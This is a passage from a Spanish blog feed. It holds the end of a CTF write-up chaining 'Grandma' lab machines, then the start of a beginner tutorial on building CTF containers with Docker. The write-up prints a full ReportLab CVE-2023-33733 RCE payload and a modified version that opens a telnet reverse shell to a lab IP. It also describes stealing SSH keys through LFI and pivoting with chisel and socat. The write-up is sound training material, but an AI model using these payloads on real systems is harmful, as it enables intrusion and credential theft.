+&lt;p&gt;&lt;img src=&quot;img/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Enumeración Grandma 2&lt;/h2&gt;
+&lt;p&gt;Escaneo nmap a Grandma2:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver el &lt;strong&gt;puerto&lt;/strong&gt; &lt;strong&gt;9000&lt;/strong&gt;, vamos a ver que es:&lt;/p&gt;
+&lt;p&gt;Configuro el &lt;strong&gt;proxy&lt;/strong&gt; en &lt;strong&gt;socks5&lt;/strong&gt; para poder ver el puerto &lt;strong&gt;9000&lt;/strong&gt; de la segunda maquina:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver una página donde se ve que lo usan para mandar reportes de pacientes, intentemos subir un &lt;strong&gt;archivo.sh&lt;/strong&gt; con una &lt;strong&gt;reverse shell&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vemos que solo podemos subir archivos .html, probare a subir un archivo e interceptarlo con burpsuite:&lt;/p&gt;
+&lt;p&gt;Para esto tendremos que seleccionar normalmente el proxy de Burpsuite en FoxyProxy y en en Burpsuite iremos a la siguiente configuración:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Settings &amp;gt;&amp;gt; Networks &amp;gt;&amp;gt; Connections&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Y bajaremos a la parte de SOCKS Proxy y configuraremos el túnel de chisel que tiene conectividad con la grandma2:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Si lo enviamos al &lt;strong&gt;Repeater&lt;/strong&gt; y le damos a &lt;strong&gt;send&lt;/strong&gt; podremos ver lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Intrusión Grandma 2&lt;/h2&gt;
+&lt;p&gt;Vemos que usa &lt;strong&gt;ReportLab&lt;/strong&gt; para convertir el .html en un .pdf, asi que buscare algun CVE reciente:&lt;/p&gt;
+&lt;p&gt;Encontre este CVE:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/Sudistark/BB-Writeups/blob/main/2023/CVE-2023-33733-rce-via-htmli-in-reportlab.md&quot;&gt;https://github.com/Sudistark/BB-Writeups/blob/main/2023/CVE-2023-33733-rce-via-htmli-in-reportlab.md&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Donde nos deja el siguiente payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;para&amp;gt;&amp;lt;font color=&quot;[[[getattr(pow, Word(&apos;__globals__&apos;))[&apos;os&apos;].system(&apos;touch /tmp/exploited&apos;) for Word in [ orgTypeFun( &apos;Word&apos;, (str,), { &apos;mutated&apos;: 1, &apos;startswith&apos;: lambda self, x: 1 == 0, &apos;__eq__&apos;: lambda self, x: self.mutate() and self.mutated &amp;lt; 0 and str(self) == x, &apos;mutate&apos;: lambda self: { setattr(self, &apos;mutated&apos;, self.mutated - 1) }, &apos;__hash__&apos;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &apos;red&apos;&quot;&amp;gt;
+                exploit
+&amp;lt;/font&amp;gt;&amp;lt;/para&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nosotros en este caso no queremos que cree un archivo llamado &lt;code&gt;exploited&lt;/code&gt; si no queremos una reverse shell, en mi caso la hare con &lt;strong&gt;telnet&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;para&amp;gt;
+    &amp;lt;font color=&quot;[ [ getattr(pow,Attacker(&apos;__globals__&apos;))[&apos;os&apos;].system(&apos;TF=$(mktemp -u);mkfifo $TF &amp;amp;&amp;amp; telnet 20.20.20.2 4444 0&amp;lt;$TF | bash 1&amp;gt;$TF&apos;) for Attacker in [orgTypeFun(&apos;
+Attacker&apos;, (str,), { &apos;mutated&apos;: 1, &apos;startswith&apos;: lambda self, x: False, &apos;__eq__&apos;: lambda self,x: self.mutate() and self.mutated &amp;lt; 0 and str(self) == x, &apos;mutate&apos;: lambda self:
+{setattr(self, &apos;mutated&apos;, self.mutated - 1)}, &apos;__hash__&apos;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and &apos;red&apos;&quot;&amp;gt;
+    exploit
+    &amp;lt;/font&amp;gt;
+&amp;lt;/para&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tendremos que configurar &lt;strong&gt;socat&lt;/strong&gt; en la primera máquina para recibir la reverse shell:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Somo usuario &lt;strong&gt;app&lt;/strong&gt;, en esta máquina tampoco podremos escalar privilegios, antes en el escaneo pudimos ver el puerto &lt;strong&gt;2222&lt;/strong&gt; que corresponde al &lt;em&gt;SSH&lt;/em&gt; asi que intentare ver si el usuario &lt;strong&gt;app&lt;/strong&gt; tiene &lt;strong&gt;id_rsa&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Bien ahora podremos iniciar las veces que queramos como el usuario app, esto nos ayudara porque al ser usuario app mediante una reverse shell se nos podría haber complicado el crear el túnel, ahora si iremos a la tercera:&lt;/p&gt;
+&lt;p&gt;Montaremos un nuevo túnel desde &lt;strong&gt;grandma1&lt;/strong&gt; a la &lt;strong&gt;grandma2&lt;/strong&gt; con &lt;strong&gt;chisel&lt;/strong&gt; y &lt;strong&gt;socat&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Activaremos el &lt;strong&gt;dynamic_chain&lt;/strong&gt; en &lt;code&gt;/etc/proxychains4.conf&lt;/code&gt; y comentaremos &lt;strong&gt;strict_chain&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Añadiremos el túnel:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora configuraremos el &lt;em&gt;foxyproxy&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Enumeración Grandma 3&lt;/h2&gt;
+&lt;p&gt;Escaneo nmap a la &lt;strong&gt;Grandma3&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vemos que tiene el &lt;strong&gt;puerto&lt;/strong&gt; &lt;strong&gt;2222&lt;/strong&gt; y &lt;strong&gt;3000&lt;/strong&gt; abierto, vamos a acceder al &lt;strong&gt;3000&lt;/strong&gt; a ver que contiene:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que es una página en blanco y si vemos su código no habrá nada:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Si inspeccionamos la página y vamos a &lt;strong&gt;almacenamiento&lt;/strong&gt; podremos ver que tenemos una &lt;strong&gt;cookie&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Pero si reiniciamos la web se cambia la &lt;strong&gt;cookie&lt;/strong&gt; así que &lt;strong&gt;no&lt;/strong&gt; es &lt;strong&gt;estática&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Intrusión Grandma 3&lt;/h2&gt;
+&lt;p&gt;Vamos a interceptar con &lt;strong&gt;burpsuite&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora interceptaremos la recarga de la web:&lt;/p&gt;
+&lt;p&gt;Podremos ver que la cookie se almacena en un campo llamado profile:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que la &lt;strong&gt;cookie&lt;/strong&gt; esta en &lt;strong&gt;base64&lt;/strong&gt;, asi que lo que intentare es un &lt;strong&gt;LFI&lt;/strong&gt; en &lt;strong&gt;base64&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Tenemos capacidad de lectura de archivos, podremos ver que hay un &lt;strong&gt;usuario&lt;/strong&gt; llamado &lt;strong&gt;node&lt;/strong&gt; asi que sabiendo que tiene el puerto &lt;em&gt;2222&lt;/em&gt; volveremos a robarle el &lt;strong&gt;id_rsa&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Mismo proceso para tener conectividad con la Grandma4:&lt;/p&gt;
+&lt;p&gt;En la &lt;em&gt;grandma2&lt;/em&gt; abriremos un &lt;strong&gt;nuevo&lt;/strong&gt; &lt;strong&gt;túnel&lt;/strong&gt; con &lt;strong&gt;socat&lt;/strong&gt; para &lt;strong&gt;redirigir&lt;/strong&gt; al &lt;strong&gt;socat&lt;/strong&gt; que está &lt;strong&gt;activo&lt;/strong&gt; en &lt;strong&gt;grandma1&lt;/strong&gt; que lleva a la &lt;strong&gt;máquina&lt;/strong&gt; &lt;strong&gt;atacante&lt;/strong&gt; al &lt;strong&gt;servidor&lt;/strong&gt; &lt;strong&gt;chisel&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora en la &lt;strong&gt;Grandma3&lt;/strong&gt; nos &lt;strong&gt;conectamos&lt;/strong&gt; como &lt;strong&gt;cliente&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Perfecto ahora configuramos el proxychains y el foxyproxy.&lt;/p&gt;
+&lt;h2&gt;Enumeración Grandma 4&lt;/h2&gt;
+&lt;p&gt;Una vez configurado vamos a hacer un escaneo nmap:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podemos ver el &lt;strong&gt;puerto&lt;/strong&gt; &lt;strong&gt;9999&lt;/strong&gt; vamos a acceder a él:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Intrusión Grandma 4&lt;/h2&gt;
+&lt;p&gt;Vemos que solo se puede acceder por &lt;strong&gt;POST&lt;/strong&gt; asi que yo voy a emplear curl:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vemos que lista los usuarios por id y nombre, pero en el ultimo podemos ver &lt;strong&gt;Error:Command error&lt;/strong&gt; así que intentaremos ejecutar un comando:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Lo que hacemos es cargar el &lt;strong&gt;módulo&lt;/strong&gt; &lt;strong&gt;child_process&lt;/strong&gt; que nos permitirá ejecutar comandos del sistema, en el &lt;em&gt;&lt;strong&gt;execSync&lt;/strong&gt;&lt;/em&gt; &lt;strong&gt;indicamos&lt;/strong&gt; el &lt;strong&gt;comando&lt;/strong&gt; que queremos ejecutar en mi caso &lt;em&gt;id&lt;/em&gt; y &lt;strong&gt;toString()&lt;/strong&gt; convierte el &lt;strong&gt;resultado&lt;/strong&gt; de &lt;strong&gt;execSync&lt;/strong&gt; en &lt;strong&gt;texto&lt;/strong&gt; &lt;strong&gt;legible&lt;/strong&gt;. Ahora nos enviaremos una reverse shell:&lt;/p&gt;
+&lt;p&gt;Antes de eso conectaremos con &lt;strong&gt;socat&lt;/strong&gt; escuchando en el &lt;strong&gt;puerto&lt;/strong&gt; &lt;strong&gt;7777&lt;/strong&gt; para que me llegue la reverse shell a la máquina atacante:\&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora nos enviaremos la reverse shell:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Crea tu CTF en Docker</title><link>https://pylonet.pages.dev/posts/creatuctf/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/creatuctf/</guid><description>Bienvenidos 👋, este es uno de los blogs más importantes para mí. Creo este blog para poder ayudar a la gente a crear sus primeros CTFS concretamente para la plataforma Dockerlabs.</description><pubDate>Sun, 28 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;📑 En este blog veremos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;📰 ¿Qué es Docker?&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;📌 ¿Como instalar Docker?&lt;/li&gt;
+&lt;li&gt;📌 Como usar Docker
+&lt;ul&gt;
+&lt;li&gt;📍Desplegar nuestro primer contenedor&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;📗 Recomendaciones al iniciar nuestro contenedor&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;⚙️ Configuración de servicios&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;📌 Iniciar servicio OpenSSH&lt;/li&gt;
+&lt;li&gt;📌 Iniciar servicio FTP&lt;/li&gt;
+&lt;li&gt;📌 Iniciar servicio Apache2&lt;/li&gt;
+&lt;li&gt;📌 Iniciar servicio Nginx&lt;/li&gt;
+&lt;li&gt;📌 Crear servicio personalizado&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;⚙️ Configuración de usuarios&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;📌 Crear usuarios nuevos&lt;/li&gt;
+&lt;li&gt;📌 Eliminar usuarios&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;⚙️ Configuración de permisos&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;📌 Establecer permisos sudoers a usuarios&lt;/li&gt;
+&lt;li&gt;📌 Permisos en Apache2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;⚙️ Configuración de Dockerfile&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;📌 Exportar contenedor a &lt;em&gt;.tar&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;📝 Creación del Writeup&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;👋 Despedida&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;📰¿Qué es Docker?&lt;/h2&gt;
+&lt;p&gt;Docker es un proyecto OpenSource. Con Docker podemos utiliizar los contenedores como máquinas virtuales muy livianas y modulares.&lt;/p&gt;
+&lt;h3&gt;📌¿Como instalar Docker?&lt;/h3&gt;
+&lt;p&gt;Para instalar Docker en nuestros equipos Linux solo tendremos que poner lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Debian/Derivados:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo apt install docker.io
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;ArchLinux/Derivados:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo pacman -S docker
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Fedora/Derivados:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo dnf install docker
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h3&gt;📌Como usar Docker&lt;/h3&gt;
+&lt;p&gt;Si queremos ver las imágenes de Docker que tengamos podremos hacer un:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+ubuntu       latest    35a88802559d   7 weeks ago   78.1MB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si queremos sacar una imagen ya hecha de Ubuntu,Debian,etc... con &lt;code&gt;docker pull&lt;/code&gt; podremos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docker pull debian:latest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y nos descargará la última versión de la imagen de Debian que exista en Docker. Podemos sacar más imágenes en &lt;a href=&quot;https://hub.docker.com/&quot;&gt;DockerHub&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Si queremos listar los contenedores que tengamos podremos emplear &lt;code&gt;docker ps&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps
+CONTAINER ID   IMAGE     COMMAND       CREATED       STATUS       PORTS     NAMES
+fc58d5436a68   ubuntu    &quot;/bin/bash&quot;   3 hours ago   Up 3 hours             focused_mayer
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con &lt;code&gt;docker ps&lt;/code&gt; de manera predeterminada solo nos muestra los contenedores que estén activos, si queremos ver todos los contenedores tendremos que agregar el parámetro &lt;code&gt;-a&lt;/code&gt; o &lt;code&gt;--all&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps -a
+CONTAINER ID   IMAGE      COMMAND      CREATED      STATUS                      PORTS      NAMES
+fc58d5436a68   ubuntu    &quot;/bin/bash&quot;  3 hours ago   Up 3 hours                             focused_mayer
+27fc4260aae8   debian    &quot;/bin/bash&quot;  2 hours ago   Exited (137) 3 seconds ago             agitated_jennings
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si queremos borrar contenedores usaremos &lt;code&gt;docker rm&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;Para emplear bien este comando seguiremos esta estructura:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docker rm IDCONTENEDOR
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Recordemos que podemos usar el &lt;code&gt;docker ps -a&lt;/code&gt; para ver los ID de todos los contenedores dando si están activos o no podemos emplear &lt;code&gt;docker ps&lt;/code&gt; con el parámetro &lt;code&gt;-a&lt;/code&gt; o &lt;code&gt;--all&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps -a
+CONTAINER ID   IMAGE      COMMAND      CREATED          STATUS                            PORTS      NAMES
+7050ab52f603   debian      &quot;bash&quot;      2 minutes ago    Exited (137) About a minute ago              agitated_jennings
+fc58d5436a68   ubuntu    &quot;/bin/bash&quot;   3 hours ago      Up 3 hours                                   focused_mayer
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si queremos borrar todos los contenedores a la vez podemos usar los parámetros &lt;em&gt;&lt;code&gt;-a&lt;/code&gt;&lt;/em&gt; y &lt;strong&gt;&lt;code&gt;-q&lt;/code&gt;&lt;/strong&gt;, el &lt;strong&gt;&lt;code&gt;-q&lt;/code&gt;&lt;/strong&gt; nos servirá para pillar solo el &lt;strong&gt;CONTAINER ID&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps -aq
+fc58d5436a68
+27fc4260aae8
+157570dd64f0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Sabiendo esto podemos dentro del &lt;code&gt;docker rm&lt;/code&gt; la ejecución del comando &lt;code&gt;docker ps -aq&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker rm $(docker ps -aq) --force
+fc58d5436a68
+27fc4260aae8
+157570dd64f0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Usamos el &lt;strong&gt;&lt;code&gt;--force&lt;/code&gt;&lt;/strong&gt; para forzar que se elimine tanto contenedores inactivos o activos.&lt;/p&gt;
+&lt;p&gt;{{&amp;lt; details &quot;Estado &lt;em&gt;docker ps&lt;/em&gt; después de eliminarlo&quot; &amp;gt;}}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps -a
+CONTAINER ID   IMAGE      COMMAND      CREATED          STATUS        PORTS        NAMES
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;{{&amp;lt; /details &amp;gt;}}&lt;/p&gt;
+&lt;p&gt;Esto mismo podemos aplicarlo a las imágenes, solo con la diferencia que no usaremos &lt;code&gt;rm&lt;/code&gt; emplearemos &lt;strong&gt;&lt;code&gt;rmi&lt;/code&gt;&lt;/strong&gt; que nos servirá para eliminar imágenes Docker. Al igual que con &lt;code&gt;docker ps -aq&lt;/code&gt; podemos usarlo con &lt;code&gt;images&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images -aq
+2e5b8d3ef33e
+35a88802559d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora lo borraremos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker rmi $(docker images -aq) --force
+Untagged: debian:latest
+Untagged: debian@sha256:45f2e735295654f13e3be10da2a6892c708f71a71be845818f6058982761a6d3
+Deleted: sha256:2e5b8d3ef33ebde2b2a943fadb241a63de1535a007a7bd185e7037abfff99f63
+Deleted: sha256:f6faf32734e0870d82ea890737958fe33ce9ddfed27b3b157576d2aadbab3322
+Untagged: ubuntu:latest
+Untagged: ubuntu@sha256:2e863c44b718727c860746568e1d54afd13b2fa71b160f5cd9058fc436217b30
+Deleted: sha256:35a88802559dd2077e584394471ddaa1a2c5bfd16893b829ea57619301eb3908
+Deleted: sha256:a30a5965a4f7d9d5ff76a46eb8939f58e95be844de1ac4a4b452d5d31158fdea
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images -a
+REPOSITORY      TAG       IMAGE ID      CREATED      SIZE
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;También podemos hacer &quot;snapshots&quot; de nuestros contenedores de docker:&lt;/p&gt;
+&lt;p&gt;Primero pillaremos el &lt;em&gt;ID CONTAINER&lt;/em&gt; del contenedor activo que queramos hacer una snapshot:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps
+CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES
+e5b9bcc4bcf6   ubuntu    &quot;/bin/bash&quot;   12 minutes ago   Up 12 minutes             competent_moser
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora emplearemos &lt;code&gt;docker commit&lt;/code&gt; con la siguiente estructura:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docker commit IDCONTAINER nombresnapshot:latest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora lo emplearé para crear una snapshot de mi contenedor &lt;em&gt;ubuntu&lt;/em&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker commit e5b9bcc4bcf6 snapshot1:latest
+sha256:8d230ff6c31a853ed18423b3feed105cad8e448f665ee45e0f29702665fd66dc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora si hacemos un &lt;code&gt;docker images&lt;/code&gt; podremos ver la imagen &lt;code&gt;snapshot1&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED          SIZE
+snapshot1    latest    8d230ff6c31a   38 seconds ago   226MB
+ubuntu       latest    35a88802559d   7 weeks ago      78.1MB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;📍Desplegar nuestro primer contenedor&lt;/h4&gt;
+&lt;p&gt;Ya sabiendo como usar Docker a nivel básico vamos a desplegar nuestro primer contenedor, para ello podemos hacer:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo docker pull ubuntu:latest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker pull ubuntu:latest
+latest: Pulling from library/ubuntu
+9c704ecd0c69: Pull complete
+Digest: sha256:2e863c44b718727c860746568e1d54afd13b2fa71b160f5cd9058fc436217b30
+Status: Downloaded newer image for ubuntu:latest
+docker.io/library/ubuntu:latest
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si ahora hacemos un &lt;code&gt;docker images&lt;/code&gt; podremos ver la imagen de &lt;code&gt;ubuntu:latest&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+ubuntu       latest    35a88802559d   7 weeks ago   78.1MB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora lo que haremos es iniciar nuestro contenedor:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker run -dit ubuntu
+fc58d5436a6882d7a99172ae3df4b2a372b9809a7454e8a64a75bdf0aff261e1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Yo recomiendo para evitar problemas si tenemos más contenedores es iniciarlos por su &lt;code&gt;IMAGE ID&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker run -dit 35a88802559d
+fc58d5436a6882d7a99172ae3df4b2a372b9809a7454e8a64a75bdf0aff261e1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si hacemos un &lt;code&gt;docker ps&lt;/code&gt; podremos ver que se esta iniciando en segundo plano como bien le hemos indicado:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker ps
+CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES
+fc58d5436a68   ubuntu    &quot;/bin/bash&quot;   42 seconds ago   Up 40 seconds             focused_mayer
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para obtener acceso a una &lt;strong&gt;bash&lt;/strong&gt; del contedor pondremos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ docker exec -it fc58d5436a68 bash
+root@fc58d5436a68:/#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Aquí también le tendremos que indicar el &lt;code&gt;CONTAINER ID&lt;/code&gt;.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;📗Recomendaciones al iniciar nuestro contenedor&lt;/h2&gt;
+&lt;p&gt;Ya teniendo acceso a una bash del contenedor recomiendo actualizar el contenedor para evitar a futuro problemas al instalar dependencias:&lt;/p&gt;
